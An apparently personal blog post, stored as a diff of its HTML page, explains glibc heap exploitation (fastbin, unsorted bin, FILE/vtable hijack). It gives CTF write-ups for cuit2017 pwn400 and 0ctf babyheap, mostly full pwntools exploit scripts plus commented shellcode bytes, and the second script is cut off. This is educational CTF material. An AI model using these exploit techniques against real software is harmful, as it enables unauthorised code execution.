@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="https://winter3un.github.io">
+  <title>heap-all | WinterSun Space</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="涉及到的知识点1、fastbin attack 2、unsorted bin attack 3、malloc堆内存管理">
+<meta name="keywords" content="pwn,heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="heap-all">
+<meta property="og:url" content="https://winter3un.github.io/2017/06/04/heap-all/index.html">
+<meta property="og:site_name" content="WinterSun Space">
+<meta property="og:description" content="涉及到的知识点1、fastbin attack 2、unsorted bin attack 3、malloc堆内存管理">
+<meta property="og:updated_time" content="2017-06-04T16:02:54.493Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="heap-all">
+<meta name="twitter:description" content="涉及到的知识点1、fastbin attack 2、unsorted bin attack 3、malloc堆内存管理">
+  
+    <link rel="alternative" href="/atom.xml" title="WinterSun Space" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/main.css?v=4.0.0">
+  
+
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="https://avatars1.githubusercontent.com/u/12570968?v=3&amp;s=460" class="js-avatar">
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">WinterSun</a></h1>
+		</hgroup>
+
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a data-idx="0" q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a data-idx="1" q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a data-idx="2" q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/Winter3un" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Winter3un/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-sort"></i></div>
+  		<h1 class="header-author js-mobile-header hide">WinterSun</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="https://avatars1.githubusercontent.com/u/12570968?v=3&amp;s=460" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">WinterSun</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+		        
+		        	<li><a href="/archives/">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/Winter3un" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Winter3un/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-heap-all" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      heap-all
+    </h1>
+  
+
+        <a href="/2017/06/04/heap-all/" class="archive-article-date">
+  	<time datetime="2017-06-04T15:59:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-04</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="涉及到的知识点"><a href="#涉及到的知识点" class="headerlink" title="涉及到的知识点"></a>涉及到的知识点</h3><p>1、fastbin attack</p>
+<p>2、unsorted bin attack</p>
+<p>3、malloc堆内存管理</p>
+<a id="more"></a>
+<h3 id="一些记录"><a href="#一些记录" class="headerlink" title="一些记录"></a>一些记录</h3><p>当我们用malloc申请一个0x20的空间的时候，glibc实际上给予了我们一个如下这样子的一个结构。</p>
+<table>
+<thead>
+<tr>
+<th>head(0x8/0x10)</th>
+<th>data(0x20)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>注意：由于x84和x64的机器字长不一样，故其head头部大小也不一样，x86为0x8长度，x64为0x10长度。</strong></p>
+<p>data区域是我们可以进行数据输入的区间，malloc返回的指针便是该区间的首地址，记作PTR</p>
+<p>当我们free它的时候，它会判定是否与top chunk相邻，如果相邻，它将会与top chunk合并，如果不是的话，它会进一步判断自身大小是否满足fast bin的要求，fastbin的边界大小由 libc内的全局变量fast_max决定，不过x86下这个值为0x40，x64下位0x80，小于等于这个值的所有chunk，free后将有fast bin管理，如果该chunk可以重复free，我们则可以利用fast bin attack来实现<strong>有限制的地址写能力</strong>（<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a> ）。而如果边界的大小大于fastbin的边界大小，该chunk则会加入到unsorted bin中去，此时我们可以修改bk来实现unsorted attack （ <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c</a> ）如果free 一个small/large chunk 的时候，可以修改本chunk、前一个或后一个，small/large chunk的head and data，则可以进行double free攻击。（ <a href="http://www.hackdig.com/08/hack-25191.htm" target="_blank" rel="external">http://www.hackdig.com/08/hack-25191.htm</a>  ）</p>
+<h3 id="cuit2017-pwn400"><a href="#cuit2017-pwn400" class="headerlink" title="cuit2017 pwn400"></a>cuit2017 pwn400</h3><p>题目可以从我github上下载。</p>
+<p>hint：ubuntu 16.04</p>
+<p>本题利用方式为：fast bin attack 覆盖name变量实现信息泄露。  overlap chunk attack 实现 hijack fsp attack，最终修改vtable至onegadget 或者system 实现get shell。</p>
+<p>注意点：x64下面 0x220为vtable偏移量。x86么。。还没测ORZ</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-27 21:28:47</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn400"</span></div><div class="line">remote_ip = <span class="string">"119.29.87.226"</span></div><div class="line">port =  <span class="number">50004</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line">	</div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,sec)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(name)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(sec)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(data1,data2)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"5"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"Y"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(data1)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(data2)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(size,title,advise)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"6"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(size))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(title)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(advise)</div><div class="line"></div><div class="line"><span class="comment">#save(0x28,"a"*0x28+p64(0x21),"a"*0x18)</span></div><div class="line"></div><div class="line">add(<span class="string">"a"</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)+<span class="string">"\n"</span>,<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line">dele()</div><div class="line">edit(str(<span class="number">0x6020c0</span>).rjust(<span class="number">7</span>,<span class="string">"0"</span>)+<span class="string">"\n"</span>)</div><div class="line">submit(<span class="string">"a"</span>*<span class="number">0x17</span>+<span class="string">"\x00\n"</span>,<span class="string">"a"</span>*<span class="number">0x8</span>+p64(elf.got[<span class="string">"alarm"</span>])+<span class="string">"\n"</span>)</div><div class="line"><span class="comment">##leak (- limit :(</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"9"</span>)</div><div class="line"></div><div class="line">alarm_addr = u64(ru(<span class="string">",You"</span>)[<span class="number">5</span>:<span class="number">-4</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">libc_base = alarm_addr-libc.symbols[<span class="string">"alarm"</span>]</div><div class="line">one_gadget = libc_base + <span class="number">0xf5e40</span></div><div class="line">bin_sh = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">##hijack fsp</span></div><div class="line">save(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x28</span>+p64(<span class="number">0x110</span>+<span class="number">0x231</span>+<span class="number">0x1010</span>),<span class="string">"aaa\n"</span>)</div><div class="line">ru(<span class="string">"te on "</span>)</div><div class="line">addr_1 = int(ru(<span class="string">")\n"</span>)[<span class="number">2</span>:<span class="number">-2</span>],<span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x040111A\nc")</span></div><div class="line">payload  = <span class="number">0x1c</span>*p64(system_addr)</div><div class="line">payload +=<span class="string">"/\x80||/////bin/sh\x00"</span> <span class="comment">#start fsp</span></div><div class="line">payload +=<span class="number">0x16</span>*p64(addr_1)+p64(<span class="number">0</span>)+(<span class="number">0x47</span><span class="number">-0x19</span>)*p64(addr_1)+p64(addr_1)+<span class="string">"\n"</span></div><div class="line"></div><div class="line">save(<span class="number">0x380</span>,p64(system_addr)*<span class="number">4</span>+<span class="string">"\n"</span>,payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>似乎有个可以直接用来算偏移的C源码，妈妈再也不用担心我算不准偏移啦~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    fp=<span class="built_in">stderr</span>;</div><div class="line">    <span class="keyword">int</span> chain=&amp;(fp-&gt;_chain);</div><div class="line">    <span class="keyword">int</span> flags=&amp;(fp-&gt;_flags);</div><div class="line">    <span class="keyword">int</span> dis=chain-flags;</div><div class="line">  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FILE struct size: 0x%x\n"</span>,<span class="keyword">sizeof</span>(FILE));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;chain - fp: 0x%x %x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> mode=&amp;(fp-&gt;_mode);</div><div class="line">    dis=mode-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;mode - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_ptr=&amp;(fp-&gt;_IO_write_ptr);</div><div class="line">    dis=write_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_base=&amp;(fp-&gt;_IO_write_base);</div><div class="line">    dis=write_base-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_base - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> vtable_offset=&amp;(fp-&gt;_vtable_offset);</div><div class="line">    dis=vtable_offset-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;vtable_offset - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> read_ptr=&amp;(fp-&gt;_IO_read_ptr);</div><div class="line">    dis=read_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;read_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div></pre></td></tr></table></figure></p>
+<h3 id="0ctf-baby-heap"><a href="#0ctf-baby-heap" class="headerlink" title="0ctf baby heap"></a>0ctf baby heap</h3><p>这题有两种利用方式，一种是全程使用fastbin attack ，还有一种是既利用fast bin 又利用 unsorted bin attack</p>
+<p>exp1 如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-22 10:39:31</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"x86_64"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./babyheap"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></div><div class="line">	ru(<span class="string">"Command:"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"Size: "</span>)</div><div class="line">	sl(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,size,data)</span>:</span></div><div class="line">	ru(<span class="string">"Command: "</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"Index: "</span>)</div><div class="line">	sl(str(index))</div><div class="line">	ru(<span class="string">"Size: "</span>)</div><div class="line">	sl(str(size))</div><div class="line">	